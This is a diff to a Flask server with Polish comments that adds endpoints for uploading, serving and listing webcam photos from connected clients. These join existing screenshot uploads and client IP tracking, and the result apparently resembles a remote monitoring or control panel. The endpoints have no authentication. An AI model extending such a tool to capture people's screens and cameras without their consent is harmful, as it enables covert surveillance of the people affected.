@@ -9,6 +9,9 @@ import os
 app = Flask(__name__)
 CORS(app)
 
+CAMERA_DIR = "camera_shots"
+os.makedirs(CAMERA_DIR, exist_ok=True)
+
 SCREENSHOTS_DIR = "screenshots"
 os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
 
@@ -19,6 +22,102 @@ client_lock = threading.Lock()
 @app.route('/')
 def index():
     return render_template('index.html')
+
+@app.route('/api/upload_camera', methods=['POST'])
+def upload_camera():
+    """Endpoint do uploadu zdjęć z kamery"""
+    try:
+        client_id = request.form.get('id')
+        if not client_id:
+            return jsonify({'success': False, 'error': 'missing_id'})
+        
+        if 'camera' not in request.files:
+            return jsonify({'success': False, 'error': 'no_file'})
+        
+        file = request.files['camera']
+        
+        if file.filename == '':
+            return jsonify({'success': False, 'error': 'empty_file'})
+        
+        # Zapisz zdjęcie z kamery
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"camera_{client_id}_{timestamp}.jpg"
+        filepath = os.path.join(CAMERA_DIR, filename)
+        
+        # Zapisz plik
+        file.save(filepath)
+        
+        # Zaktualizuj dane klienta
+        with client_lock:
+            if client_id in clients:
+                clients[client_id]['last_camera'] = filename
+                clients[client_id]['last_camera_time'] = time.time()
+        
+        print(f"📷 Zdjęcie z kamery otrzymane od klienta {client_id}")
+        return jsonify({'success': True, 'filename': filename})
+        
+    except Exception as e:
+        print(f"❌ Błąd uploadu zdjęcia z kamery: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/get_camera/<client_id>')
+def get_camera(client_id):
+    """Pobierz najnowsze zdjęcie z kamery klienta"""
+    try:
+        with client_lock:
+            if client_id in clients:
+                filename = clients[client_id].get('last_camera')
+                if filename:
+                    filepath = os.path.join(CAMERA_DIR, filename)
+                    if os.path.exists(filepath):
+                        # Sprawdź czy zdjęcie nie jest starsze niż 5 minut
+                        camera_time = clients[client_id].get('last_camera_time', 0)
+                        if time.time() - camera_time < 300:  # 5 minut
+                            return send_from_directory(CAMERA_DIR, filename)
+        
+        # Zwróć domyślny obrazek jeśli nie ma zdjęcia z kamery
+        return send_from_directory('.', 'no_camera.png', mimetype='image/png')
+        
+    except Exception as e:
+        print(f"❌ Błąd pobierania zdjęcia z kamery: {e}")
+        return jsonify({'error': str(e)})
+
+@app.route('/api/get_clients_with_camera')
+def get_clients_with_camera():
+    """Zwraca listę klientów z informacją o zdjęciach z kamery"""
+    with client_lock:
+        current_time = time.time()
+        client_list = []
+        
+        for client_id, client_data in clients.items():
+            # Czyszczenie nieaktywnych klientów
+            if current_time - client_data['last_seen'] > 30:
+                continue
+            
+            has_camera = (
+                'last_camera' in client_data and 
+                'last_camera_time' in client_data and
+                current_time - client_data['last_camera_time'] < 300
+            )
+            
+            has_screenshot = (
+                'last_screenshot' in client_data and 
+                'last_screenshot_time' in client_data and
+                current_time - client_data['last_screenshot_time'] < 300
+            )
+            
+            client_list.append({
+                'id': client_id,
+                'name': client_data.get('name', 'Klient'),
+                'status': 'active' if current_time - client_data['last_seen'] < 10 else 'inactive',
+                'ip': client_data.get('ip', '0.0.0.0'),
+                'has_screenshot': has_screenshot,
+                'has_camera': has_camera,
+                'last_screenshot_time': client_data.get('last_screenshot_time'),
+                'last_camera_time': client_data.get('last_camera_time')
+            })
+        
+        return jsonify(client_list)
 
 @app.route('/api/upload_screenshot', methods=['POST'])
 def upload_screenshot():
